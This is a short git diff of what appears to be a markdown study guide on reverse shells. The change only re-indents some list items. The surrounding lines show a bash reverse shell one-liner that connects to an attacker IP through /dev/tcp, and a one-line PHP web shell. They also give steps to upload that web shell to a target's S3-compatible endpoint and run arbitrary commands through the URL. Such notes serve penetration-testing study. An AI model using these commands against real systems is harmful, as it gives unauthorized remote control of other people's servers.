@@ -12,13 +12,13 @@ Reverse shells are often used for gaining remote access to a system. Reverse she
 2. ```bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1```: use ```bash``` to start an interactive shell
 ### How to create a reverse shell using ```aws``` and ```php```
 1. ```nano shell.php```
-    a. Use the code editor to write a piece of code in PHP, such as:
+        a. Use the code editor to write a piece of code in PHP, such as:
    ```<? php system($_GET['cmd']); ?>```
 2. ```cat shell.php```: check for ```shell.php```
 3. ```aws s3 cp --endpoint-url=http://<target_url> shell.php s3://<target_url_w/o_extensions>```: upload ```shell.php``` to target
 4. go to web browser, enter URL ```http://<target_url>/shell.php?cmd=ls```: execute ```ls``` command in web browser
-    a. You should now have access to the target website and can execute ```bash``` commands through the URL.
-    b. Replace ```ls``` with any command (keeping in mind spaces are "```+```" in URL encoding) to execute.
+        a. You should now have access to the target website and can execute ```bash``` commands through the URL.
+        b. Replace ```ls``` with any command (keeping in mind spaces are "```+```" in URL encoding) to execute.
 
 
 # Upgrade your shell
